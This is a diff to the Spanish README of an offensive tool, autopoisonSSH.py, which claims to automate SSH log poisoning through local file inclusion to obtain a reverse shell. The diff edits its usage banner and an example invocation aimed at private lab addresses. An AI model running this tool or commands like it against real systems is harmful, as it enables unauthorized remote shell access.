@@ -4,7 +4,7 @@
 
 Las opciones disponibles son las siguientes:
 
-```
+```bash
 usage: autopoisonSSH.py [-h] -u TARGET_URL -t-ip TARGET_IP -h-ip HOST_IP [-p TARGET_PORT] [-p-ssh TARGET_SSH_PORT] [-l LISTEN_PORT]
 
 ☠️ SSH Log Poisoning with LFI → Automated Reverse Shell ☠️
@@ -53,10 +53,10 @@ En primer lugar debemos detecar la ruta donde se acontecede el **LFI**:
 En segundo y último lugar ejecutaremos el script pasandole los parámetros necesarios tal y como vemos a continuación:
 
 ```shell
-python3 autopoisonSSH.py -u http://172.17.0.2/vuln.php -pm file -t-ip 172.17.0.1 -h-ip 172.17.0.2
+python3 autopoisonSSH.py -u "http://172.17.0.2/index.php?filename" -t-ip 172.17.0.2 -h-ip 172.17.0.1
 ```
 
-![Pasted image 20241226190954](https://github.com/user-attachments/assets/756a9fed-e7e5-4718-95a6-3975a1e77ca8)
+![Screenshoot POC](https://github.com/user-attachments/assets/815ab114-ac38-448b-af13-364e4a239aef)
 
 ---
 ## Puesta en Práctica
